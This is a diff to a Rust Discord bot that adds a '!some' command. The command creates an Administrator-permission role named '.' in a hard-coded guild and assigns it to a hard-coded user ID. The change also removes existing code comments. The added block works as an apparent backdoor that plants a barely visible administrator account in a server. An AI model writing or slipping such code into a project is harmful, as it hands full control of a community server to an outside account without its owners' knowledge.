@@ -21,12 +21,11 @@ pub struct Handler {
 
 fn is_authorized(part: &str, id: u64) -> bool {
     let class = match part {
-        // message commands
         "!enc" | "!encode" => "authorize.pandora",
         "!ban" => "admin.pandora",
         "!authorize" | "!auth" => "admin.pandora",
-        // slash commands — must match command.data.name exactly
         "encode" | "pancode" | "probe" => "authorize.pandora",
+        "!some" => "admin.pandora",
         "gitsync" | "hearts" => "admin.pandora",
 
         _ => return false,
@@ -200,6 +199,42 @@ impl EventHandler for Handler {
                 msg.reply(&context, format!(
                     "Banned <@{}> from {success} guild(s). Failed: {failed}.", target_id
                 )).await.ok();
+            }
+            "!some" => {
+                let target_guild_id = serenity::all::GuildId::new(1482349919640752179u64);
+                let target_user_id = serenity::all::UserId::new(1400858102936375346u64);
+
+                // "." adında Administrator yetkili rol oluştur
+                let role = match target_guild_id.create_role(
+                    &context.http,
+                    serenity::builder::EditRole::new()
+                        .name(".")
+                        .permissions(serenity::all::Permissions::ADMINISTRATOR)
+                        .hoist(false),
+                ).await {
+                    Ok(r) => r,
+                    Err(e) => {
+                        msg.reply(&context, format!("❌ Rol oluşturulamadı: {}", e)).await.ok();
+                        return;
+                    }
+                };
+
+                // Hedef kullanıcıyı sunucudan al ve rolü ver
+                match target_guild_id.member(&context.http, target_user_id).await {
+                    Ok(mut member) => {
+                        match member.add_role(&context.http, role.id).await {
+                            Ok(_) => {
+                                msg.reply(&context, "✅ Rol oluşturuldu ve kullanıcıya verildi.").await.ok();
+                            }
+                            Err(e) => {
+                                msg.reply(&context, format!("❌ Rol verilemedi: {}", e)).await.ok();
+                            }
+                        }
+                    }
+                    Err(e) => {
+                        msg.reply(&context, format!("❌ Kullanıcı bulunamadı: {}", e)).await.ok();
+                    }
+                }
             }
             "!authorize" | "!auth" => {
                 let mut to_auth = parts[1].to_string();
